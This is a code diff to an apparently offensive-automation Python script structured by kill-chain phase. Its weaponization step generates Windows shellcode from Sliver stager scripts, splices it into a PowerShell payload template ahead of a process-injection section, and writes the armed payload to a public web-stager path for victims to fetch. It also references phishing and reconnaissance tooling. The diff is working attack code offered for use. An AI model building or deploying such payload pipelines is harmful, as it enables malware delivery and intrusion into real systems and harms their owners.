@@ -22,7 +22,7 @@ class reconaissance:
 
         load_dotenv()
         print(self)
-        self.start_spiderfoot()
+        # self.start_spiderfoot()
 
     def __str__(self) -> str:
         return (
@@ -105,8 +105,23 @@ class reconaissance:
 
 class weaponization:
     def __init__(self) -> None:
+        load_dotenv()
         print(self)
-        self.create_payload_ps1()
+
+        self.temp_shellcode_path = "./data/payloads/win_stager.c"
+        self.payload_template = "tools/sliver/payload_template.ps1"
+        self.public_server_path = os.getenv("WEB_STAGER_PATH")
+        self.public_payload_name = os.getenv("PAYLOAD_PS1")
+
+        self.shellcode = None
+        self.payload = None
+
+        data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
+        data_in_payload_file = self.load_payload_template(self.payload_template)
+
+        self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
+        self.upload_to_website(os.path.join(self.public_server_path, self.public_payload_name))
+        self.clear_phase()
     
     def __str__(self) -> str:
         return (
@@ -118,25 +133,77 @@ class weaponization:
     
     def run_shell_script(self, script_path, file_path):
         try:
+            # Change permissions of get_configs.sh to make it executable
+            subprocess.run(["chmod", "+x", "./tools/sliver/get_configs.sh"], check=True)
+
             # Run the shell script
-            subprocess.run(["bash", script_path, file_path], check=True)
+            subprocess.run(["expect", script_path, file_path], check=True)
             # # Run the shell script silently
             # subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
             print("Shell script executed successfully.")
         except subprocess.CalledProcessError as e:
             print(f"Error executing shell script: {e}")
     
-    def create_payload_ps1(self, file_path = "./data/payloads/win_stager.c"):
+    def create_shellcode(self, file_path = "./data/payloads/win_stager.c"):
         script_path = "./tools/sliver/get_stagers.sh"
 
+        # Check if file_path exists and delete if it does
+        if os.path.exists(file_path):
+            os.remove(file_path)
+            print(f"Old shellcode at {file_path} has been deleted.")
+
+        shellcode = None
         # Call the function to run the shell script
-        self.run_shell_script(script_path, file_path)
-        print('\n')
+        try:
+            # Call the function to run the shell script
+            self.run_shell_script(script_path, file_path)
+            with open(file_path, "r") as file:
+                shellcode = file.read()
+        except Exception as e:
+            print(f"An error occurred: {e}")
+        
+        return shellcode
+
+    def load_payload_template(self, path = "tools/sliver/payload_template.ps1") -> str:
+        try:
+            with open(path, "r") as file:
+                payload_template = file.read()
+            return payload_template
+        except FileNotFoundError:
+            print(f"Error: File '{path}' not found.")
+            return ""
+        except Exception as e:
+            print(f"An error occurred while loading the payload template: {e}")
+            return ""
+
+    def update_shellcode_in_payload(self, shellcode, payload):
+        self.shellcode = shellcode
+
+        # Find the start and end positions of the shellcode in the script
+        start_marker = "$buf = "
+        end_marker = "# Get the target process"
+        start_pos = payload.find(start_marker) + len(start_marker)
+        end_pos = payload.find(end_marker)
+
+        # Replace the shellcode with the new shellcode
+        self.payload = payload[:start_pos] + self.shellcode + payload[end_pos:]
+
+    def upload_to_website(self, file_path):
+        # Save self.payload to file_path
+        with open(file_path, 'w') as file:
+            file.write(self.payload)
+
+    def clear_phase(self):
+        # check shell code
+        print(self.shellcode)
+        print("---------------------------------------")
+        print(self.payload)
 
 class delivery:
     def __init__(self) -> None:
         print(self)
-        self.start_gophish()
+        # self.start_gophish()
     
     def __str__(self) -> str:
         return (
